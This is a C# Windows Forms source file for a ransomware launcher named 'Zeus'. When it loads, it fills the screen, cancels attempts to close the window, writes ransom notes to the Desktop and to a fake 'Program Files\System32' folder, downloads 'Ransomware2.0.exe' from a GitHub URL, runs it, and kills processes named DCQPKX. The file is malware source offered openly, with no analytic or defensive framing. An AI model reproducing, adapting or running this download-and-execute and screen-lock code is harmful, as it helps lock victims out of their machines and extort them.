using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Zeus
{
    public partial class launcher : Form
    {
        public launcher()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
        }

        private void launcher_FormClosing(object sender, FormClosingEventArgs e)
        {

            e.Cancel = true;

        }

        private void launcher_Load(object sender, EventArgs e)
        {

            Directory.CreateDirectory("C:\\Program Files\\System32");
            File.WriteAllText("C:\\Program Files\\System32\\README.txt", "You were encrypted by the Zeus ransomware by akkaiba....");

            this.Left = 0;
            this.Top = 0;
            this.Width = Screen.PrimaryScreen.Bounds.Width;
            this.Height = Screen.PrimaryScreen.Bounds.Height;

            string path_cache = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string existfile = path_cache + @"\._cache_DCQPKX.exe";
            if (!File.Exists(existfile))
            {
                string pathcachefile = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

                using (StreamWriter streamWriter = File.CreateText(pathcachefile + @"\._cache_DCQPKX.exe"))
                {
                    streamWriter.WriteLine("Your files have been locked!");
                }
            }

            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            using (StreamWriter streamWriter = File.CreateText(path + @"\RANSOMWARE2.0.txt"))
            {
                streamWriter.WriteLine("Your files have been locked!");
            }

            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;

            WebClient webClient = new WebClient();
            webClient.DownloadFile("https://github.com/akkaiba/zeus-ransomware-master/blob/main/Ransomware2.0.exe", @"C:\Program Files\System32\Ransomware2.0.exe");

            Process.Start("C:\\Program Files\\System32\\Ransomware2.0.exe");

            Process[] _process = null;
            _process = Process.GetProcessesByName("DCQPKX");
            foreach (Process proces in _process)
            {
                proces.Kill();
            }

            Process[] _process2 = null;
            _process2 = Process.GetProcessesByName("._cache_DCQPKX");
            foreach (Process proces2 in _process2)
            {
                proces2.Kill();
            }
        }
    }
}
